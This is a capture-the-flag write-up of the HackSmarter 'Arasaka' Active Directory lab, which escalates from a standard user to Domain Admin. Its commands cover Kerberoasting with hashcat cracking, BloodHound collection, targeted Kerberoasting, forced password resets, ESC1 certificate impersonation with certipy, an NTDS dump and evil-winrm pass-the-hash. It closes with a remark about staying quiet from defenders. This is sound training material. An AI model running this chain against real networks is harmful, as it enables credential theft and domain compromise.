---
title: 'HackSmarter: Arasaka'
date: '2026-09-18'
excerpt: Arasaka is a easy Active Directory lab that starts with valid credentials for a standard domain user. The attack chain involves Kerberoasting, BloodHound, abusing GenericAll and GenericWrite, and finally exploiting an ESC1-vulnerable AD CS template to compromise a Domain Admin.
readingTime: 1
tags:
  - Writeup
  - hacksmarter
  - Windows
  - Active Directory
  - Easy
author: pir4cy
coverImage: /images/writeups/covers/hacksmarter/hsm-arasaka-cover.jpeg
draft: false
---

# Arasaka
## Objective and Scope

You are a member of the Hack Smarter Red Team. This penetration test will operate under an assumed breach scenario, starting with valid credentials for a standard domain user, faraday.

The primary goal is to simulate a realistic attack, identifying and exploiting vulnerabilities to escalate privileges from a standard user to a Domain Administrator.

## Initial Access
- Target IP: 10.1.55.75

- Starting Credentials: `faraday:hacksmarter123`

## Enumeration

The methodology for enumeration remains the same - review open ports, enumerate the services one by one and hopefully, there are enough trails that can lead to domain admin.

### RustScan

Starting off with Rustscan - 

```bash
rustscan -a 10.1.55.75 --ulimit 5000 -- -A -sC -sV -o arasaka.nmap
```

![Rustscan Scan](/images/writeups/machines/hacksmarter/HSM_Arasaka/rustscan.png "RustScan")

Looks like we can start with our enumeration via SMB. 

### SMB Enumeration

Since we already have credentials, let's test what shares we can gather as the user `faraday`. 

```bash
nxc smb 10.1.55.75 -u faraday -p pass.txt --shares
```

![SMB Shares](/images/writeups/machines/hacksmarter/HSM_Arasaka/nxc-smb-shares.png "SMB Shares")

```bash
nxc smb 10.1.55.75 -u faraday -p pass.txt --users
```

![SMB Users](/images/writeups/machines/hacksmarter/HSM_Arasaka/nxc-smb-users.png "SMB Users")

> You can generate the user list and save it by using `--users-export users.txt` instead of just `--users`

Now that we have a list of users, we have a potential list of targets for lateral movement. 

Before jumpting to that, we can use nxc to generate a hosts file for us and pass that to /etc/hosts.
```bash
nxc smb 10.1.55.75 -u faraday -p pass.txt --generate-hosts-file hosts.txt
```


## Foothold

In our enumeration, we see quite a few service accounts. With multiple service accounts, there is a high chance that we can try to target accounts for Kerberoasting. 

### Kerberoasting - Alt.svc

Let's look for Kerberoastable accounts using netexec.
```bash
nxc ldap 10.1.55.75 -u faraday -p pass.txt --kerberoasting krb.txt
```

![Kerberoasting](/images/writeups/machines/hacksmarter/HSM_Arasaka/nxc-ldap-kerberoast.png "Kerberoasting")

The command will store the extracted TGS in a file called `krb.txt`. We can then pass this file to hashcat and attempt to crack the hash for a potential password.

```bash
hashcat -m 13100 krb.txt /usr/share/worldlists/rockyou.txt
```

![alt.svc hash cracked](/images/writeups/machines/hacksmarter/HSM_Arasaka/hashcat-krb-cracked.png "alt.svc hash cracked")

Weak passwords ftw! This is where having a stronger password would've resulted in ruining our kerberoast attempt. 

### Bloodhound Enumeration

With alt.svc, let's run bloodhound and enumerate the domain.

```bash
nxc ldap DC01.hacksmarter.local -d 'hacksmarter.local' -u alt.svc -p <REDACTED> --blooodhound --collection All --dns-server 10.1.55.75
```

![Bloodhound - alt.svc](/images/writeups/machines/hacksmarter/HSM_Arasaka/bloodhound-collect.png "Bloodhound Enumeration")

Upload the collected files (zip) to bloodhound and let's check what we can do as alt.svc

![Bloodhound - alt.svc GenericAll](/images/writeups/machines/hacksmarter/HSM_Arasaka/yorinobu-genericAll.png "Alt.SVC GenericAll Yorinobu")

From bloodhound, we see that `alt.svc` has GenericAll permissions for the account `Yorinobu`. 
> **GenericAll** means full control over the target AD object. When `alt.svc` has
> `GenericAll` over the user `Yorinobu`, it can modify the account in ways that
> enable several attack paths:
>
> - **Targeted Kerberoasting:** Add an SPN to `Yorinobu`, request a TGS for it,
>   and attempt to crack the resulting ticket offline.
> - **Force password change:** Reset `Yorinobu`'s password without knowing the
>   existing password, allowing authentication as the account.
> - **Shadow Credentials:** Modify `msDS-KeyCredentialLink` to associate an
>   attacker-controlled key with the account and authenticate through Kerberos
>   PKINIT. 

## Lateral Movement - Yorinobu

### Targeted Kerberoast

First I attempted doing a targeted kerberoast attack on yorinobu. 

The attack is simple and lucky for us, there is a script that can help us target the account, change the SPN, request a ticket and grab the hash.

```bash
python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'hacksmarter.local' -u 'alt.svc' -p '<REDACTED>' -o yorinobu-krb.txt
```

![Targeted Kerberoast](/images/writeups/machines/hacksmarter/HSM_Arasaka/yorinobu-targeted-kerb-success.png "Targeted Kerberoast Success")

Crack the retrieved hash with hashcat.

```bash
hashcat -m 13100 yorinobu-krb.txt /usr/share/wordlists/rockyou.txt
```

![Hash Crack Fail](/images/writeups/machines/hacksmarter/HSM_Arasaka/yorinobu-krb-crack-fail.png "Hash Crack Failed")

Unlucky for us, Yorinobu is using a password that was not found in rockyou. Let's move to our second method - Forcing a password change.

### Forcing Password Reset

This one is pretty straightforward but can also lead to lockouts or authentication issues in a real pentest. I would avoid it unless you absolutely have to use it.

Two options for this.

1. Net RPC.
Bloodhound just gives you a direct command that you can use and achieve password change.

```bash
net rpc password 'yorinobu' 'pir4cy1sc00l@' -U 'hacksmarter.local'/'alt.svc'%'<REDACTED>' -S dc01.hacksmarter.local
```
> No output generally means it worked
2. Using BloodyAD
BloodyAD is a nice tool to interact with AD directly from your attack machine. I added it to my toolkit after doing some machines over at HackTheBox (read [Puppy](../htb/Puppy.md) & [EscapeTwo](blog/EscapeTwo))

```bash
bloodyad --host DC01.hacksmarter.local -d 'hacksmarter.local' -u 'alt.svc' -p '<REDACTED>' set password 'yorinobu' 'pir4cy1sc00l@'
```
> Gives nice output on whether it worked or not

Once the change goes through, test the new credentials using netexec.

```bash
nxc smb dc01 -u yorinobu -p 'pir4cy1sc00l@'
```

![Yorinobu Access Confirmed](/images/writeups/machines/hacksmarter/HSM_Arasaka/yorinobu-accessed.png "Yorinobu Access Confirmed")


## Lateral Movement - SoulKiller.svc

With Yorinobu's account, let's see what permissions we have and if we can move to another account - 

![Bloodhound Yorinobu](/images/writeups/machines/hacksmarter/HSM_Arasaka/yori-soulkiller-genericwrite.png "Bloodhound Yorinobu")

Looks like Yorinobu has GenericWrite permissions for the account `soulkiller.svc`

> GenericWrite gives us the ability to write to the target account. The options to abuse this permission are similar to what we did earlier. 

Again, let's try Targeted Kerberoasting first, then try other methods as needed.

### Targeted Keberoast

```bash
python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'pir4cy1sc00l@' -o soulkiller_svc-krb.txt
```

![Targeted Kerberoast Soulkiller SVC](/images/writeups/machines/hacksmarter/HSM_Arasaka/soulkiller_svc_targetedkrbroast.png "Targeted Kerberoast Success - Soulkiller SVC")

Crack the retrieved hash with hashcat.

```bash
hashcat -m 13100 soulkiller_svc-krb.txt /usr/share/wordlist/rockyou.txt
```

![Soulkiller password cracked](/images/writeups/machines/hacksmarter/HSM_Arasaka/soulkiller_pass_cracked.png "Soulkiller password cracked")

## Root

With the `soulkiller.svc` account, the description is interesting

![SoulKiller SVC Description](/images/writeups/machines/hacksmarter/HSM_Arasaka/soulkiller_adcs.png "Description of SoulKiller SVC")

Let's enumerate certificate templates and see if we can find a vulnerable template.

You can either use netexec for this or use certipy. I have used certipy in this case.

```bash
certipy-ad find -target-ip 10.1.55.75 -u 'soulkiller.svc' -p '<REDACTED>' -vulnerable
```

![Certipy ADCS Enumeration](/images/writeups/machines/hacksmarter/HSM_Arasaka/soulkiller_adcs-enum.png "Certipy ADCS Enumeration")

Reading the generated files, we find a template named "AI Takeover". This template is ESC1 vulnerable, meaning anyone can request a certificate on behalf of any user. The certificate can then be used to authenticate as the target user.

```
Request a certificate as target user -> Authenticate as the user and grab NTLM hash -> Login with the hash -> Profit
```


Let's try to abuse the vulnerability and  gain access to the Administrator account.

```bash
certipy-ad req -u 'soulkiller.svc@hacksmarter.local' -p '<REDACTED>' -dc-ip '10.1.55.75' -target 'DC01.hacksmarter.local' -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'Administrator@hacksmarter.local'

certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.55.75
```

![ESC1 Admin Fail](/images/writeups/machines/hacksmarter/HSM_Arasaka/esc1_admin_fail.png "ESC1 failed for Administrator")

Unfortunately for us, this login was not allowed. Let's see if we can move to any other user with higher privileges.

![Domain Admins](/images/writeups/machines/hacksmarter/HSM_Arasaka/domain-admins.png "Domain Admins")

The account `the_emperor` is also a Domain Admin. Let's see if we can target this user instead.

We will use the same commands.

```bash
certipy-ad req -u 'soulkiller.svc@hacksmarter.local' -p '<REDACTED>' -dc-ip '10.1.55.75' -target 'DC01.hacksmarter.local' -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local'

certipy-ad auth -pfx the_emperor.pfx -dc-ip 10.1.55.75
```

![ESC1 The_Emperor Success](/images/writeups/machines/hacksmarter/HSM_Arasaka/esc1_emperor_success.png "ESC1 The_Emperor Success")

With the hash, we have successfully compromised the domain!

Let's dump NTDS and grab the root.txt file to complete the lab.

```bash
nxc smb dc01 -u the_emperor -H <NTLM HASH> --ntds
```

![NTDS dump](/images/writeups/machines/hacksmarter/HSM_Arasaka/ntds-dump.png "NTDS Dump")

```bash
evil-winrm -i dc01 -u the_emperor -H <NTLM HASH> 

evil-winrm-shell > type C:\Users\Administrator\Desktop\root.txt
```

![Root Access](/images/writeups/machines/hacksmarter/HSM_Arasaka/root-via-emperor.png "Root obtained")

# Conclusion

Arasaka was a good reminder that Active Directory attacks rarely come down to one single vulnerability. The interesting part was connecting the permissions and misconfigurations that were scattered throughout the environment.

I also liked that the first approach against Yorinobu did not work. The targeted Kerberoast produced a hash, but cracking it went nowhere, so having multiple ways to abuse the same permission became important.

The biggest takeaway for me was to avoid tunnel vision after gaining an account. Once you have access, keep checking what that account can actually control. In this case, `GenericAll`, `GenericWrite`, and an AD CS misconfiguration each looked like separate findings, but together they formed a complete path to Domain Admin.

I may end up writing a separate blog about these permissions and how they can be abused. We should also look into how blue team can monitor these attacks so we can try and be as quiet as possible. 
